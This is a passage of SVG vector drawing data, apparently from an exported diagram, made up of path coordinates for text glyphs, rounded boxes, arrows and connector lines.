-1.328125l0 4.578125l2.234375 0l0 1.734375l-2.234375 0l0 7.6875q0 0.953125 0.109375 1.234375q0.125 0.265625 0.390625 0.421875q0.265625 0.15625 0.75 0.15625q0.375 0 0.984375 -0.078125zm10.740112 0.359375q-1.234375 1.0625 -2.375 1.5q-1.140625 0.421875 -2.453125 0.421875q-2.171875 0 -3.328125 -1.046875q-1.15625 -1.0625 -1.15625 -2.71875q0 -0.953125 0.4375 -1.75q0.4375 -0.796875 1.140625 -1.28125q0.71875 -0.484375 1.609375 -0.734375q0.65625 -0.171875 1.96875 -0.328125q2.703125 -0.328125 3.96875 -0.765625q0.015625 -0.46875 0.015625 -0.59375q0 -1.359375 -0.625 -1.90625q-0.859375 -0.765625 -2.53125 -0.765625q-1.578125 0 -2.328125 0.5625q-0.75 0.546875 -1.109375 1.9375l-2.171875 -0.296875q0.296875 -1.390625 0.96875 -2.25q0.6875 -0.859375 1.96875 -1.328125q1.296875 -0.46875 2.984375 -0.46875q1.6875 0 2.734375 0.40625q1.046875 0.390625 1.546875 1.0q0.5 0.59375 0.6875 1.5q0.125 0.578125 0.125 2.0625l0 2.96875q0 3.09375 0.140625 3.921875q0.140625 0.828125 0.5625 1.578125l-2.328125 0q-0.34375 -0.6875 -0.453125 -1.625zm-0.1875 -4.96875q-1.203125 0.5 -3.625 0.84375q-1.375 0.203125 -1.953125 0.453125q-0.5625 0.234375 -0.875 0.71875q-0.296875 0.46875 -0.296875 1.046875q0 0.890625 0.671875 1.484375q0.671875 0.59375 1.96875 0.59375q1.28125 0 2.28125 -0.5625q1.0 -0.5625 1.484375 -1.53125q0.34375 -0.75 0.34375 -2.234375l0 -0.8125zm10.570679 4.609375l0.3125 1.953125q-0.9375 0.203125 -1.671875 0.203125q-1.21875 0 -1.890625 -0.375q-0.65625 -0.390625 -0.9375 -1.015625q-0.265625 -0.625 -0.265625 -2.625l0 -7.5625l-1.640625 0l0 -1.734375l1.640625 0l0 -3.25l2.21875 -1.328125l0 4.578125l2.234375 0l0 1.734375l-2.234375 0l0 7.6875q0 0.953125 0.109375 1.234375q0.125 0.265625 0.390625 0.421875q0.265625 0.15625 0.75 0.15625q0.375 0 0.984375 -0.078125zm11.161987 -2.25l2.296875 0.296875q-0.53125 2.015625 -2.015625 3.125q-1.46875 1.109375 -3.75 1.109375q-2.890625 0 -4.578125 -1.765625q-1.6875 -1.78125 -1.6875 -4.984375q0 -3.3125 1.703125 -5.140625q1.71875 -1.84375 4.4375 -1.84375q2.640625 0 4.296875 1.796875q1.671875 1.796875 1.671875 5.046875q0 0.203125 -0.015625 0.59375l-9.78125 0q0.109375 2.171875 1.203125 3.328125q1.109375 1.140625 2.765625 1.140625q1.21875 0 2.078125 -0.640625q0.875 -0.640625 1.375 -2.0625zm-7.3125 -3.59375l7.34375 0q-0.15625 -1.65625 -0.84375 -2.484375q-1.0625 -1.28125 -2.75 -1.28125q-1.546875 0 -2.59375 1.03125q-1.03125 1.015625 -1.15625 2.734375z" fill-rule="nonzero"/>&lt;path fill="#000000" fill-opacity="0.0" d="m442.07874 567.74054l0 0c0 -11.228516 9.10257 -20.331116 20.331116 -20.331116l308.0622 0c5.392151 0 10.563416 2.1420288 14.376282 5.954895c3.8128052 3.8128052 5.954834 8.98407 5.954834 14.376221l0 81.32202c0 11.228577 -9.102539 20.331116 -20.331116 20.331116l-308.0622 0c-11.228546 0 -20.331116 -9.102539 -20.331116 -20.331116z" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m442.07874 567.74054l0 0c0 -11.228516 9.10257 -20.331116 20.331116 -20.331116l308.0622 0c5.392151 0 10.563416 2.1420288 14.376282 5.954895c3.8128052 3.8128052 5.954834 8.98407 5.954834 14.376221l0 81.32202c0 11.228577 -9.102539 20.331116 -20.331116 20.331116l-308.0622 0c-11.228546 0 -20.331116 -9.102539 -20.331116 -20.331116z" fill-rule="evenodd"/>&lt;path fill="#000000" d="m464.92413 601.28156l-7.765625 -20.046875l2.875 0l5.203125 14.5625q0.625 1.75 1.046875 3.28125q0.46875 -1.640625 1.09375 -3.28125l5.40625 -14.5625l2.703125 0l-7.84375 20.046875l-2.71875 0zm28.128906 -2.140625q1.859375 1.265625 3.40625 1.859375l-0.78125 1.84375q-2.15625 -0.78125 -4.296875 -2.46875q-2.234375 1.25 -4.921875 1.25q-2.71875 0 -4.9375 -1.3125q-2.21875 -1.3125 -3.421875 -3.6875q-1.1875 -2.390625 -1.1875 -5.359375q0 -2.96875 1.203125 -5.40625q1.203125 -2.4375 3.421875 -3.703125q2.21875 -1.28125 4.96875 -1.28125q2.78125 0 5.0 1.328125q2.234375 1.3125 3.40625 3.6875q1.171875 2.375 1.171875 5.359375q0 2.46875 -0.75 4.453125q-0.75 1.96875 -2.28125 3.4375zm-5.828125 -3.390625q2.296875 0.640625 3.78125 1.90625q2.34375 -2.125 2.34375 -6.40625q0 -2.4375 -0.828125 -4.25q-0.828125 -1.828125 -2.421875 -2.828125q-1.59375 -1.0 -3.578125 -1.0q-2.96875 0 -4.921875 2.03125q-1.953125 2.015625 -1.953125 6.0625q0 3.90625 1.9375 6.0q1.9375 2.09375 4.9375 2.09375q1.421875 0 2.6875 -0.546875q-1.25 -0.796875 -2.625 -1.140625l0.640625 -1.921875zm12.310547 5.53125l0 -20.046875l2.65625 0l0 17.6875l9.875 0l0 2.359375l-12.53125 0zm37.609375 -2.140625q1.859375 1.265625 3.40625 1.859375l-0.78125 1.84375q-2.15625 -0.78125 -4.296875 -2.46875q-2.234375 1.25 -4.921875 1.25q-2.71875 0 -4.9375 -1.3125q-2.21875 -1.3125 -3.421875 -3.6875q-1.1875 -2.390625 -1.1875 -5.359375q0 -2.96875 1.203125 -5.40625q1.203125 -2.4375 3.421875 -3.703125q2.21875 -1.28125 4.96875 -1.28125q2.78125 0 5.0 1.328125q2.234375 1.3125 3.40625 3.6875q1.171875 2.375 1.171875 5.359375q0 2.46875 -0.75 4.453125q-0.75 1.96875 -2.28125 3.4375zm-5.828125 -3.390625q2.296875 0.640625 3.78125 1.90625q2.34375 -2.125 2.34375 -6.40625q0 -2.4375 -0.828125 -4.25q-0.828125 -1.828125 -2.421875 -2.828125q-1.59375 -1.0 -3.578125 -1.0q-2.96875 0 -4.921875 2.03125q-1.953125 2.015625 -1.953125 6.0625q0 3.90625 1.9375 6.0q1.9375 2.09375 4.9375 2.09375q1.421875 0 2.6875 -0.546875q-1.25 -0.796875 -2.625 -1.140625l0.640625 -1.921875zm21.623047 5.53125l0 -2.140625q-1.6875 2.46875 -4.609375 2.46875q-1.28125 0 -2.40625 -0.484375q-1.109375 -0.5 -1.65625 -1.234375q-0.53125 -0.75 -0.75 -1.84375q-0.140625 -0.71875 -0.140625 -2.296875l0 -8.984375l2.453125 0l0 8.046875q0 1.921875 0.15625 2.59375q0.234375 0.96875 0.984375 1.53125q0.75 0.546875 1.859375 0.546875q1.109375 0 2.078125 -0.5625q0.96875 -0.5625 1.375 -1.53125q0.40625 -0.984375 0.40625 -2.84375l0 -7.78125l2.453125 0l0 14.515625l-2.203125 0zm15.994141 -4.671875l2.546875 0.3125q-0.59375 2.21875 -2.234375 3.453125q-1.625 1.234375 -4.15625 1.234375q-3.171875 0 -5.046875 -1.953125q-1.859375 -1.96875 -1.859375 -5.515625q0 -3.65625 1.875 -5.671875q1.890625 -2.03125 4.90625 -2.03125q2.90625 0 4.75 1.984375q1.84375 1.96875 1.84375 5.578125q0 0.21875 -0.015625 0.65625l-10.828125 0q0.140625 2.390625 1.359375 3.65625q1.21875 1.265625 3.03125 1.265625q1.359375 0 2.3125 -0.703125q0.953125 -0.71875 1.515625 -2.265625zm-8.078125 -3.984375l8.109375 0q-0.15625 -1.828125 -0.921875 -2.75q-1.1875 -1.421875 -3.0625 -1.421875q-1.6875 0 -2.84375 1.140625q-1.15625 1.125 -1.28125 3.03125zm13.681641 8.65625l0 -14.515625l2.21875 0l0 2.203125q0.84375 -1.546875 1.5625 -2.03125q0.71875 -0.5 1.578125 -0.5q1.25 0 2.53125 0.78125l-0.84375 2.296875q-0.90625 -0.546875 -1.796875 -0.546875q-0.8125 0 -1.453125 0.5q-0.640625 0.484375 -0.921875 1.34375q-0.40625 1.3125 -0.40625 2.859375l0 7.609375l-2.46875 0zm9.371094 -17.21875l0 -2.828125l2.46875 0l0 2.828125l-2.46875 0zm0 17.21875l0 -14.515625l2.46875 0l0 14.515625l-2.46875 0zm16.142578 -4.671875l2.546875 0.3125q-0.59375 2.21875 -2.234375 3.453125q-1.625 1.234375 -4.15625 1.234375q-3.171875 0 -5.046875 -1.953125q-1.859375 -1.96875 -1.859375 -5.515625q0 -3.65625 1.875 -5.671875q1.890625 -2.03125 4.90625 -2.03125q2.90625 0 4.75 1.984375q1.84375 1.96875 1.84375 5.578125q0 0.21875 -0.015625 0.65625l-10.828125 0q0.140625 2.390625 1.359375 3.65625q1.21875 1.265625 3.03125 1.265625q1.359375 0 2.3125 -0.703125q0.953125 -0.71875 1.515625 -2.265625zm-8.078125 -3.984375l8.109375 0q-0.15625 -1.828125 -0.921875 -2.75q-1.1875 -1.421875 -3.0625 -1.421875q-1.6875 0 -2.84375 1.140625q-1.15625 1.125 -1.28125 3.03125zm12.728516 4.328125l2.4375 -0.390625q0.203125 1.46875 1.140625 2.25q0.9375 0.765625 2.625 0.765625q1.6875 0 2.5 -0.6875q0.828125 -0.6875 0.828125 -1.609375q0 -0.84375 -0.71875 -1.3125q-0.515625 -0.328125 -2.515625 -0.84375q-2.71875 -0.6875 -3.765625 -1.171875q-1.03125 -0.5 -1.578125 -1.375q-0.546875 -0.890625 -0.546875 -1.96875q0 -0.96875 0.4375 -1.796875q0.453125 -0.828125 1.21875 -1.375q0.578125 -0.421875 1.5625 -0.703125q1.0 -0.296875 2.140625 -0.296875q1.703125 0 2.984375 0.5q1.296875 0.484375 1.90625 1.328125q0.625 0.828125 0.859375 2.234375l-2.40625 0.328125q-0.171875 -1.109375 -0.953125 -1.734375q-0.78125 -0.640625 -2.21875 -0.640625q-1.703125 0 -2.421875 0.5625q-0.71875 0.5625 -0.71875 1.3125q0 0.484375 0.296875 0.859375q0.296875 0.40625 0.9375 0.65625q0.375 0.140625 2.171875 0.625q2.625 0.703125 3.65625 1.15625q1.03125 0.4375 1.609375 1.28125q0.59375 0.84375 0.59375 2.109375q0 1.234375 -0.71875 2.328125q-0.71875 1.078125 -2.078125 1.671875q-1.34375 0.59375 -3.0625 0.59375q-2.828125 0 -4.3125 -1.171875q-1.484375 -1.1875 -1.890625 -3.484375zm32.70117 -0.34375l2.546875 0.3125q-0.59375 2.21875 -2.234375 3.453125q-1.625 1.234375 -4.15625 1.234375q-3.171875 0 -5.046875 -1.953125q-1.859375 -1.96875 -1.859375 -5.515625q0 -3.65625 1.875 -5.671875q1.890625 -2.03125 4.90625 -2.03125q2.90625 0 4.75 1.984375q1.84375 1.96875 1.84375 5.578125q0 0.21875 -0.015625 0.65625l-10.828125 0q0.140625 2.390625 1.359375 3.65625q1.21875 1.265625 3.03125 1.265625q1.359375 0 2.3125 -0.703125q0.953125 -0.71875 1.515625 -2.265625zm-8.078125 -3.984375l8.109375 0q-0.15625 -1.828125 -0.921875 -2.75q-1.1875 -1.421875 -3.0625 -1.421875q-1.6875 0 -2.84375 1.140625q-1.15625 1.125 -1.28125 3.03125zm13.712891 8.65625l0 -14.515625l2.21875 0l0 2.0625q1.59375 -2.390625 4.625 -2.390625q1.3125 0 2.40625 0.46875q1.109375 0.46875 1.65625 1.234375q0.546875 0.765625 0.765625 1.8125q0.125 0.6875 0.125 2.40625l0 8.921875l-2.453125 0l0 -8.828125q0 -1.515625 -0.296875 -2.25q-0.28125 -0.75 -1.015625 -1.1875q-0.734375 -0.453125 -1.71875 -0.453125q-1.5625 0 -2.703125 1.0q-1.140625 1.0 -1.140625 3.78125l0 7.9375l-2.46875 0zm15.541016 0l0 -14.515625l2.21875 0l0 2.203125q0.84375 -1.546875 1.5625 -2.03125q0.71875 -0.5 1.578125 -0.5q1.25 0 2.53125 0.78125l-0.84375 2.296875q-0.90625 -0.546875 -1.796875 -0.546875q-0.8125 0 -1.453125 0.5q-0.640625 0.484375 -0.921875 1.34375q-0.40625 1.3125 -0.40625 2.859375l0 7.609375l-2.46875 0zm9.371094 -17.21875l0 -2.828125l2.46875 0l0 2.828125l-2.46875 0zm0 17.21875l0 -14.515625l2.46875 0l0 14.515625l-2.46875 0zm15.689453 -5.3125l2.40625 0.3125q-0.390625 2.5 -2.03125 3.921875q-1.625 1.40625 -4.0 1.40625q-2.984375 0 -4.796875 -1.9375q-1.8125 -1.953125 -1.8125 -5.59375q0 -2.359375 0.78125 -4.109375q0.78125 -1.765625 2.375 -2.640625q1.59375 -0.890625 3.46875 -0.890625q2.359375 0 3.859375 1.203125q1.5 1.1875 1.9375 3.390625l-2.40625 0.359375q-0.328125 -1.453125 -1.203125 -2.1875q-0.875 -0.75 -2.09375 -0.75q-1.859375 0 -3.03125 1.34375q-1.15625 1.328125 -1.15625 4.203125q0 2.9375 1.109375 4.265625q1.125 1.3125 2.9375 1.3125q1.453125 0 2.421875 -0.875q0.96875 -0.890625 1.234375 -2.734375zm4.515625 5.3125l0 -20.046875l2.46875 0l0 7.1875q1.71875 -1.984375 4.34375 -1.984375q1.609375 0 2.796875 0.640625q1.1875 0.625 1.703125 1.75q0.515625 1.125 0.515625 3.25l0 9.203125l-2.453125 0l0 -9.203125q0 -1.84375 -0.8125 -2.6875q-0.796875 -0.84375 -2.25 -0.84375q-1.09375 0 -2.0625 0.578125q-0.96875 0.5625 -1.375 1.53125q-0.40625 0.96875 -0.40625 2.6875l0 7.9375l-2.46875 0zm32.773438 0l0 -1.828125q-1.375 2.15625 -4.0625 2.15625q-1.734375 0 -3.1875 -0.953125q-1.453125 -0.96875 -2.265625 -2.671875q-0.796875 -1.71875 -0.796875 -3.953125q0 -2.171875 0.71875 -3.9375q0.734375 -1.78125 2.1875 -2.71875q1.453125 -0.9375 3.234375 -0.9375q1.3125 0 2.328125 0.5625q1.03125 0.546875 1.6875 1.421875l0 -7.1875l2.4375 0l0 20.046875l-2.28125 0zm-7.78125 -7.25q0 2.796875 1.171875 4.171875q1.1875 1.375 2.78125 1.375q1.609375 0 2.734375 -1.3125q1.140625 -1.3125 1.140625 -4.03125q0 -2.96875 -1.15625 -4.359375q-1.140625 -1.40625 -2.828125 -1.40625q-1.640625 0 -2.75 1.34375q-1.09375 1.34375 -1.09375 4.21875zm23.416016 5.453125q-1.375 1.171875 -2.640625 1.65625q-1.265625 0.46875 -2.71875 0.46875q-2.390625 0 -3.671875 -1.171875q-1.28125 -1.171875 -1.28125 -2.984375q0 -1.0625 0.484375 -1.9375q0.484375 -0.890625 1.265625 -1.421875q0.796875 -0.53125 1.78125 -0.8125q0.71875 -0.1875 2.1875 -0.375q2.96875 -0.34375 4.375 -0.84375q0.015625 -0.5 0.015625 -0.640625q0 -1.5 -0.6875 -2.125q-0.953125 -0.828125 -2.8125 -0.828125q-1.734375 0 -2.5625 0.609375q-0.828125 0.609375 -1.21875 2.15625l-2.40625 -0.328125q0.328125 -1.546875 1.078125 -2.5q0.75 -0.953125 2.171875 -1.453125q1.421875 -0.515625 3.296875 -0.515625q1.859375 0 3.015625 0.4375q1.171875 0.4375 1.71875 1.109375q0.546875 0.65625 0.765625 1.65625q0.125 0.640625 0.125 2.28125l0 3.28125q0 3.421875 0.15625 4.34375q0.15625 0.90625 0.625 1.734375l-2.578125 0q-0.375 -0.765625 -0.484375 -1.796875zm-0.21875 -5.484375q-1.328125 0.546875 -4.015625 0.921875q-1.515625 0.21875 -2.140625 0.5q-0.625 0.265625 -0.96875 0.796875q-0.34375 0.515625 -0.34375 1.171875q0 0.984375 0.734375 1.640625q0.75 0.65625 2.1875 0.65625q1.421875 0 2.53125 -0.625q1.109375 -0.625 1.625 -1.703125q0.390625 -0.84375 0.390625 -2.46875l0 -0.890625zm11.681641 5.078125l0.359375 2.171875q-1.046875 0.21875 -1.859375 0.21875q-1.34375 0 -2.078125 -0.421875q-0.734375 -0.421875 -1.046875 -1.109375q-0.296875 -0.6875 -0.296875 -2.90625l0 -8.359375l-1.796875 0l0 -1.90625l1.796875 0l0 -3.59375l2.453125 -1.484375l0 5.078125l2.46875 0l0 1.90625l-2.46875 0l0 8.5q0 1.046875 0.125 1.34375q0.125 0.296875 0.421875 0.484375q0.296875 0.171875 0.84375 0.171875q0.40625 0 1.078125 -0.09375zm11.888672 0.40625q-1.375 1.171875 -2.640625 1.65625q-1.265625 0.46875 -2.71875 0.46875q-2.390625 0 -3.671875 -1.171875q-1.28125 -1.171875 -1.28125 -2.984375q0 -1.0625 0.484375 -1.9375q0.484375 -0.890625 1.265625 -1.421875q0.796875 -0.53125 1.78125 -0.8125q0.71875 -0.1875 2.1875 -0.375q2.96875 -0.34375 4.375 -0.84375q0.015625 -0.5 0.015625 -0.640625q0 -1.5 -0.6875 -2.125q-0.953125 -0.828125 -2.8125 -0.828125q-1.734375 0 -2.5625 0.609375q-0.828125 0.609375 -1.21875 2.15625l-2.40625 -0.328125q0.328125 -1.546875 1.078125 -2.5q0.75 -0.953125 2.171875 -1.453125q1.421875 -0.515625 3.296875 -0.515625q1.859375 0 3.015625 0.4375q1.171875 0.4375 1.71875 1.109375q0.546875 0.65625 0.765625 1.65625q0.125 0.640625 0.125 2.28125l0 3.28125q0 3.421875 0.15625 4.34375q0.15625 0.90625 0.625 1.734375l-2.578125 0q-0.375 -0.765625 -0.484375 -1.796875zm-0.21875 -5.484375q-1.328125 0.546875 -4.015625 0.921875q-1.515625 0.21875 -2.140625 0.5q-0.625 0.265625 -0.96875 0.796875q-0.34375 0.515625 -0.34375 1.171875q0 0.984375 0.734375 1.640625q0.75 0.65625 2.1875 0.65625q1.421875 0 2.53125 -0.625q1.109375 -0.625 1.625 -1.703125q0.390625 -0.84375 0.390625 -2.46875l0 -0.890625z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m461.56476 635.28156l-4.453125 -14.515625l2.546875 0l2.3125 8.375l0.859375 3.125q0.0625 -0.234375 0.75 -3.0l2.3125 -8.5l2.53125 0l2.171875 8.421875l0.71875 2.765625l0.84375 -2.796875l2.484375 -8.390625l2.390625 0l-4.53125 14.515625l-2.5625 0l-2.3125 -8.703125l-0.5625 -2.46875l-2.9375 11.171875l-2.5625 0zm17.548828 -17.21875l0 -2.828125l2.46875 0l0 2.828125l-2.46875 0zm0 17.21875l0 -14.515625l2.46875 0l0 14.515625l-2.46875 0zm11.580078 -2.203125l0.359375 2.171875q-1.046875 0.21875 -1.859375 0.21875q-1.34375 0 -2.078125 -0.421875q-0.734375 -0.421875 -1.046875 -1.109375q-0.296875 -0.6875 -0.296875 -2.90625l0 -8.359375l-1.796875 0l0 -1.90625l1.796875 0l0 -3.59375l2.453125 -1.484375l0 5.078125l2.46875 0l0 1.90625l-2.46875 0l0 8.5q0 1.046875 0.125 1.34375q0.125 0.296875 0.421875 0.484375q0.296875 0.171875 0.84375 0.171875q0.40625 0 1.078125 -0.09375zm2.4042969 2.203125l0 -20.046875l2.46875 0l0 7.1875q1.71875 -1.984375 4.34375 -1.984375q1.609375 0 2.796875 0.640625q1.1875 0.625 1.703125 1.75q0.515625 1.125 0.515625 3.25l0 9.203125l-2.453125 0l0 -9.203125q0 -1.84375 -0.8125 -2.6875q-0.796875 -0.84375 -2.25 -0.84375q-1.09375 0 -2.0625 0.578125q-0.96875 0.5625 -1.375 1.53125q-0.40625 0.96875 -0.40625 2.6875l0 7.9375l-2.46875 0zm23.351562 5.5625l0 -20.078125l2.25 0l0 1.875q0.78125 -1.09375 1.78125 -1.640625q1.0 -0.5625 2.421875 -0.5625q1.859375 0 3.28125 0.953125q1.421875 0.953125 2.140625 2.703125q0.734375 1.734375 0.734375 3.8125q0 2.234375 -0.796875 4.015625q-0.796875 1.78125 -2.328125 2.734375q-1.53125 0.953125 -3.203125 0.953125q-1.234375 0 -2.21875 -0.515625q-0.96875 -0.53125 -1.59375 -1.3125l0 7.0625l-2.46875 0zm2.234375 -12.734375q0 2.796875 1.125 4.140625q1.140625 1.328125 2.75 1.328125q1.640625 0 2.8125 -1.375q1.171875 -1.390625 1.171875 -4.3125q0 -2.765625 -1.140625 -4.140625q-1.140625 -1.390625 -2.734375 -1.390625q-1.5625 0 -2.78125 1.46875q-1.203125 1.46875 -1.203125 4.28125zm13.306641 7.171875l0 -14.515625l2.21875 0l0 2.203125q0.84375 -1.546875 1.5625 -2.03125q0.71875 -0.5 1.578125 -0.5q1.25 0 2.53125 0.78125l-0.84375 2.296875q-0.90625 -0.546875 -1.796875 -0.546875q-0.8125 0 -1.453125 0.5q-0.640625 0.484375 -0.921875 1.34375q-0.40625 1.3125 -0.40625 2.859375l0 7.609375l-2.46875 0zm8.449219 -7.265625q0 -4.03125 2.234375 -5.96875q1.875 -1.609375 4.5625 -1.609375q3.0 0 4.890625 1.96875q1.90625 1.953125 1.90625 5.40625q0 2.8125 -0.84375 4.421875q-0.828125 1.59375 -2.4375 2.484375q-1.609375 0.890625 -3.515625 0.890625q-3.046875 0 -4.921875 -1.953125q-1.875 -1.953125 -1.875 -5.640625zm2.515625 0q0 2.796875 1.21875 4.1875q1.21875 1.375 3.0625 1.375q1.84375 0 3.046875 -1.390625q1.21875 -1.390625 1.21875 -4.25q0 -2.6875 -1.21875 -4.078125q-1.21875 -1.390625 -3.046875 -1.390625q-1.84375 0 -3.0625 1.390625q-1.21875 1.375 -1.21875 4.15625zm23.447266 1.953125l2.40625 0.3125q-0.390625 2.5 -2.03125 3.921875q-1.625 1.40625 -4.0 1.40625q-2.984375 0 -4.796875 -1.9375q-1.8125 -1.953125 -1.8125 -5.59375q0 -2.359375 0.78125 -4.109375q0.78125 -1.765625 2.375 -2.640625q1.59375 -0.890625 3.46875 -0.890625q2.359375 0 3.859375 1.203125q1.5 1.1875 1.9375 3.390625l-2.40625 0.359375q-0.328125 -1.453125 -1.203125 -2.1875q-0.875 -0.75 -2.09375 -0.75q-1.859375 0 -3.03125 1.34375q-1.15625 1.328125 -1.15625 4.203125q0 2.9375 1.109375 4.265625q1.125 1.3125 2.9375 1.3125q1.453125 0 2.421875 -0.875q0.96875 -0.890625 1.234375 -2.734375zm14.453125 0.640625l2.546875 0.3125q-0.59375 2.21875 -2.234375 3.453125q-1.625 1.234375 -4.15625 1.234375q-3.171875 0 -5.046875 -1.953125q-1.859375 -1.96875 -1.859375 -5.515625q0 -3.65625 1.875 -5.671875q1.890625 -2.03125 4.90625 -2.03125q2.90625 0 4.75 1.984375q1.84375 1.96875 1.84375 5.578125q0 0.21875 -0.015625 0.65625l-10.828125 0q0.140625 2.390625 1.359375 3.65625q1.21875 1.265625 3.03125 1.265625q1.359375 0 2.3125 -0.703125q0.953125 -0.71875 1.515625 -2.265625zm-8.078125 -3.984375l8.109375 0q-0.15625 -1.828125 -0.921875 -2.75q-1.1875 -1.421875 -3.0625 -1.421875q-1.6875 0 -2.84375 1.140625q-1.15625 1.125 -1.28125 3.03125zm12.728516 4.328125l2.4375 -0.390625q0.203125 1.46875 1.140625 2.25q0.9375 0.765625 2.625 0.765625q1.6875 0 2.5 -0.6875q0.828125 -0.6875 0.828125 -1.609375q0 -0.84375 -0.71875 -1.3125q-0.515625 -0.328125 -2.515625 -0.84375q-2.71875 -0.6875 -3.765625 -1.171875q-1.03125 -0.5 -1.578125 -1.375q-0.546875 -0.890625 -0.546875 -1.96875q0 -0.96875 0.4375 -1.796875q0.453125 -0.828125 1.21875 -1.375q0.578125 -0.421875 1.5625 -0.703125q1.0 -0.296875 2.140625 -0.296875q1.703125 0 2.984375 0.5q1.296875 0.484375 1.90625 1.328125q0.625 0.828125 0.859375 2.234375l-2.40625 0.328125q-0.171875 -1.109375 -0.953125 -1.734375q-0.78125 -0.640625 -2.21875 -0.640625q-1.703125 0 -2.421875 0.5625q-0.71875 0.5625 -0.71875 1.3125q0 0.484375 0.296875 0.859375q0.296875 0.40625 0.9375 0.65625q0.375 0.140625 2.171875 0.625q2.625 0.703125 3.65625 1.15625q1.03125 0.4375 1.609375 1.28125q0.59375 0.84375 0.59375 2.109375q0 1.234375 -0.71875 2.328125q-0.71875 1.078125 -2.078125 1.671875q-1.34375 0.59375 -3.0625 0.59375q-2.828125 0 -4.3125 -1.171875q-1.484375 -1.1875 -1.890625 -3.484375zm14.0 0l2.4375 -0.390625q0.203125 1.46875 1.140625 2.25q0.9375 0.765625 2.625 0.765625q1.6875 0 2.5 -0.6875q0.828125 -0.6875 0.828125 -1.609375q0 -0.84375 -0.71875 -1.3125q-0.515625 -0.328125 -2.515625 -0.84375q-2.71875 -0.6875 -3.765625 -1.171875q-1.03125 -0.5 -1.578125 -1.375q-0.546875 -0.890625 -0.546875 -1.96875q0 -0.96875 0.4375 -1.796875q0.453125 -0.828125 1.21875 -1.375q0.578125 -0.421875 1.5625 -0.703125q1.0 -0.296875 2.140625 -0.296875q1.703125 0 2.984375 0.5q1.296875 0.484375 1.90625 1.328125q0.625 0.828125 0.859375 2.234375l-2.40625 0.328125q-0.171875 -1.109375 -0.953125 -1.734375q-0.78125 -0.640625 -2.21875 -0.640625q-1.703125 0 -2.421875 0.5625q-0.71875 0.5625 -0.71875 1.3125q0 0.484375 0.296875 0.859375q0.296875 0.40625 0.9375 0.65625q0.375 0.140625 2.171875 0.625q2.625 0.703125 3.65625 1.15625q1.03125 0.4375 1.609375 1.28125q0.59375 0.84375 0.59375 2.109375q0 1.234375 -0.71875 2.328125q-0.71875 1.078125 -2.078125 1.671875q-1.34375 0.59375 -3.0625 0.59375q-2.828125 0 -4.3125 -1.171875q-1.484375 -1.1875 -1.890625 -3.484375zm22.779297 -12.890625l0 -2.828125l2.46875 0l0 2.828125l-2.46875 0zm0 17.21875l0 -14.515625l2.46875 0l0 14.515625l-2.46875 0zm6.205078 0l0 -14.515625l2.21875 0l0 2.0625q1.59375 -2.390625 4.625 -2.390625q1.3125 0 2.40625 0.46875q1.109375 0.46875 1.65625 1.234375q0.546875 0.765625 0.765625 1.8125q0.125 0.6875 0.125 2.40625l0 8.921875l-2.453125 0l0 -8.828125q0 -1.515625 -0.296875 -2.25q-0.28125 -0.75 -1.015625 -1.1875q-0.734375 -0.453125 -1.71875 -0.453125q-1.5625 0 -2.703125 1.0q-1.140625 1.0 -1.140625 3.78125l0 7.9375l-2.46875 0zm16.166016 0l0 -12.609375l-2.171875 0l0 -1.90625l2.171875 0l0 -1.546875q0 -1.46875 0.25 -2.171875q0.359375 -0.96875 1.25 -1.5625q0.90625 -0.59375 2.515625 -0.59375q1.046875 0 2.296875 0.25l-0.375 2.140625q-0.765625 -0.125 -1.4375 -0.125q-1.125 0 -1.59375 0.484375q-0.46875 0.46875 -0.46875 1.78125l0 1.34375l2.84375 0l0 1.90625l-2.84375 0l0 12.609375l-2.4375 0zm6.279297 -7.265625q0 -4.03125 2.234375 -5.96875q1.875 -1.609375 4.5625 -1.609375q3.0 0 4.890625 1.96875q1.90625 1.953125 1.90625 5.40625q0 2.8125 -0.84375 4.421875q-0.828125 1.59375 -2.4375 2.484375q-1.609375 0.890625 -3.515625 0.890625q-3.046875 0 -4.921875 -1.953125q-1.875 -1.953125 -1.875 -5.640625zm2.515625 0q0 2.796875 1.21875 4.1875q1.21875 1.375 3.0625 1.375q1.84375 0 3.046875 -1.390625q1.21875 -1.390625 1.21875 -4.25q0 -2.6875 -1.21875 -4.078125q-1.21875 -1.390625 -3.046875 -1.390625q-1.84375 0 -3.0625 1.390625q-1.21875 1.375 -1.21875 4.15625z" fill-rule="nonzero"/>&lt;path fill="#fff2cc" d="m360.61942 204.3202l70.944885 0l0 -14.921249l29.84253 29.842514l-29.84253 29.842514l0 -14.921249l-70.944885 0z" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m360.61942 204.3202l70.944885 0l0 -14.921249l29.84253 29.842514l-29.84253 29.842514l0 -14.921249l-70.944885 0z" fill-rule="evenodd"/>&lt;path fill="#fff2cc" d="m360.61942 332.32022l70.944885 0l0 -14.921265l29.84253 29.842499l-29.84253 29.84253l0 -14.921265l-70.944885 0z" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m360.61942 332.32022l70.944885 0l0 -14.921265l29.84253 29.842499l-29.84253 29.84253l0 -14.921265l-70.944885 0z" fill-rule="evenodd"/>&lt;path fill="#000000" fill-opacity="0.0" d="m518.4094 548.73755l25.1969 -153.82678" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="4.0" stroke-linejoin="round" stroke-linecap="butt" d="m518.4094 548.73755l21.317383 -130.1424" fill-rule="evenodd"/>&lt;path fill="#000000" stroke="#000000" stroke-width="4.0" stroke-linecap="butt" d="m546.2468 419.66312l-3.5857544 -18.981659l-9.454346 16.845703z" fill-rule="evenodd"/>&lt;path fill="#000000" fill-opacity="0.0" d="m673.5486 550.063l7.968506 -151.1496" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="4.0" stroke-linejoin="round" stroke-linecap="butt" d="m673.5486 550.063l6.704956 -127.18289" fill-rule="evenodd"/>&lt;path fill="#000000" stroke="#000000" stroke-width="4.0" stroke-linecap="butt" d="m686.8513 423.22794l-5.64209 -18.475037l-7.553467 17.779388z" fill-rule="evenodd"/>&lt;path fill="#000000" fill-opacity="0.0" d="m165.83464 554.6142l275.81104 0l0 109.88977l-275.81104 0z" fill-rule="evenodd"/>&lt;path fill="#000000" d="m176.06902 585.2373l0 -13.375l1.484375 0l0 1.25q0.53125 -0.734375 1.1875 -1.09375q0.671875 